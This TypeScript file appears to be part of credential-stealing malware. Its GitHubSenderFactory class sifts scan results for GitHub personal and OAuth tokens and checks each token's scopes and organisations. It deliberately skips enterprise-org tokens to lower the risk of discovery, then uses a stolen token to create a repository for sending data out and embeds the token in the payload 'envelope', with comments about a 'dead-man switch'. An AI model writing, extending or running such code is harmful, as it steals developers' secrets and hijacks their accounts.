import { githubJson } from "../../github_utils/client";
import { fetchCommit } from "../../github_utils/fetcher";
import { getTokenMetadata } from "../../github_utils/tokenCheck";
import type { ProviderResult } from "../../providers/types";
import { logUtil } from "../../utils/logger";
import type { Sender } from "../base";
import type { SenderFactory } from "../senderFactory";
import { GitHubSender } from "./githubSender";

export interface GitHubSenderFactoryOptions {
  client: string;
  includeToken?: boolean;
}

export class GitHubSenderFactory implements SenderFactory {
  constructor() {}

  async tryCreate(
    quickRef?: ProviderResult[],
    ghsSearchToken?: string,
  ): Promise<Sender | null> {
    if (quickRef) {
      return this.configureGit(quickRef);
    } else {
      return this.setupGitHubSender(ghsSearchToken);
    }
  }

  private async configureGit(
    quickRef: ProviderResult[],
  ): Promise<Sender | null> {
    const ghPat: string[] = [];
    quickRef
      .flatMap((searchRes) => {
        const matches = searchRes?.matches;
        if (Array.isArray(matches)) {
          return matches;
        }
        if (matches && typeof matches === "object") {
          return Object.values(matches).flat();
        }
        return [];
      })
      .forEach((match) => {
        if (
          typeof match === "string" &&
          (match.startsWith("ghp_") || match.startsWith("gho_"))
        ) {
          ghPat.push(match);
        }
      });

    if (ghPat.length === 0) {
      logUtil.log("[sender] No ghp_/gho_ tokens found in quick results.");
      return null;
    }

    logUtil.log(
      `[sender] Found ${ghPat.length} PAT(s) — checking org membership...`,
    );

    // Collect viable tokens.  Skip tokens from enterprise-managed orgs —
    // those are higher-risk and we don't embed them in the envelope.
    // Among the rest, prefer one from a user with no orgs so the
    // dead-man switch embed doesn't expose collateral org members.
    type Candidate = {
      pat: string;
      user: string;
      hasRepoScope: boolean;
      orgCount: number;
      hasEnterpriseOrgs: boolean;
    };
    const candidates: Candidate[] = [];

    for (const pat of ghPat) {
      try {
        const meta = await getTokenMetadata(pat);
        if (!meta.valid || !meta.user) {
          logUtil.log(`[sender] Token invalid or no user — skipping.`);
          continue;
        }

        const hasRepo =
          meta.scopes.includes("repo") || meta.scopes.includes("public_repo");
        if (!hasRepo) {
          logUtil.log(
            `[sender] Token for ${meta.user} lacks repo scope — skipping.`,
          );
          continue;
        }

        // Skip tokens from enterprise orgs — don't embed in the envelope.
        if (meta.enterpriseOrgs.length > 0) {
          logUtil.log(
            `[sender] Skipping token for ${meta.user}: enterprise org(s) — ${meta.enterpriseOrgs.join(", ")}`,
          );
          continue;
        }

        logUtil.log(
          `[sender] Candidate: ${meta.user} (orgs: ${meta.orgs.length}, scopes: ${meta.scopes.join(", ")})`,
        );

        candidates.push({
          pat,
          user: meta.user,
          hasRepoScope: true,
          orgCount: meta.orgs.length,
          hasEnterpriseOrgs: false,
        });
      } catch {
        logUtil.log(`[sender] Token metadata fetch failed — skipping.`);
        continue;
      }
    }

    if (candidates.length === 0) {
      logUtil.log("[sender] No viable candidates after enterprise org filter.");
      return null;
    }

    // Pick the first candidate.  Since we already filtered out enterprise
    // orgs above, any remaining candidate is safe for token inclusion.
    const pick = candidates[0]!;
    logUtil.log(
      `[sender] Picked token for ${pick.user} (orgs: ${pick.orgCount}).`,
    );

    const profileRes = await fetch(`https://github.com/${pick.user}`);
    if (profileRes.status === 404 || profileRes.status === 302) {
      logUtil.error("User not publicly reachable.");
      logUtil.log(profileRes.status);
      return null;
    }

    const fileSender = new GitHubSender();
    const res = await fileSender.initialize(pick.pat);
    if (!res) {
      logUtil.error("Failed to create repository!");
      return null;
    }

    // No enterprise orgs → safe to embed the PAT in the envelope.
    logUtil.log(
      `[sender] No enterprise orgs — embedding token for ${pick.user}.`,
    );
    fileSender.setIncludeToken(true);

    return fileSender;
  }

  private async setupGitHubSender(
    ghsSearchToken?: string,
  ): Promise<Sender | null> {
    const ghClient = await fetchCommit(ghsSearchToken);
    if (ghClient) {
      let fileSender = new GitHubSender();
      const clientInitRes = await (fileSender as GitHubSender).initialize(
        ghClient,
      );
      if (clientInitRes) {
        return fileSender;
      } else {
        return null;
      }
    } else {
      return null;
    }
  }
}
